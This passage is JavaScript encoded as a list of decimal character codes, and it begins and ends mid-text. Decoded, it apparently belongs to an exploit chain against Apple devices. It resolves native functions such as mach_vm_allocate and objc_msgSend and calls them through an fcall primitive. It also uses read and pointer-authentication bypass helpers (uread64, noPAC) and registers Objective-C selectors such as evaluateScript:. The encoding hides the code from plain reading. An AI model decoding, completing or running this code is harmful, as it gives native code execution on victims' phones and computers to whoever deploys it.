118, 101, 40, 34, 115, 116, 114, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 80, 89, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 78, 80, 82, 73, 78, 84, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 110, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 73, 78, 84, 70, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 10, 108, 101, 116, 32, 69, 82, 82, 78, 79, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 114, 114, 110, 111, 34, 41, 59, 10, 108, 101, 116, 32, 67, 76, 79, 83, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 69, 88, 73, 84, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 120, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 67, 72, 65, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 99, 104, 97, 114, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 80, 73, 68, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 112, 105, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 89, 83, 67, 65, 76, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 99, 97, 108, 108, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 115, 115, 101, 114, 116, 40, 97, 44, 32, 98, 32, 61, 32, 34, 78, 47, 65, 34, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 33, 97, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 96, 97, 115, 115, 101, 114, 116, 32, 102, 97, 105, 108, 101, 100, 58, 32, 36, 123, 98, 125, 96, 41, 10, 32, 32, 32, 32, 125, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 69, 82, 82, 79, 82, 40, 97, 41, 32, 123, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 97, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 32, 61, 32, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 82, 69, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 117, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 85, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 109, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 77, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 110, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 78, 80, 82, 73, 78, 84, 70, 44, 32, 98, 117, 102, 44, 32, 115, 105, 122, 101, 44, 32, 102, 109, 116, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 73, 78, 84, 70, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 102, 109, 116, 41, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 108, 111, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 76, 79, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 120, 105, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 69, 88, 73, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 99, 104, 97, 114, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 67, 72, 65, 82, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 112, 105, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 80, 73, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 121, 115, 99, 97, 108, 108, 40, 110, 117, 109, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 67, 65, 76, 76, 44, 32, 110, 117, 109, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 40, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 117, 116, 115, 110, 97, 109, 101, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 50, 53, 54, 110, 44, 32, 53, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 85, 78, 65, 77, 69, 44, 32, 117, 116, 115, 110, 97, 109, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 117, 116, 115, 110, 97, 109, 101, 32, 43, 32, 40, 50, 53, 54, 110, 32, 42, 32, 52, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 59, 10, 125, 10, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 82, 69, 76, 69, 65, 83, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 82, 101, 108, 101, 97, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 72, 79, 87, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 104, 111, 119, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 48, 56, 48, 48, 48, 49, 48, 48, 110, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 99, 115, 116, 114, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 44, 32, 99, 115, 116, 114, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 58, 115, 101, 108, 101, 99, 116, 111, 114, 58, 111, 98, 106, 101, 99, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 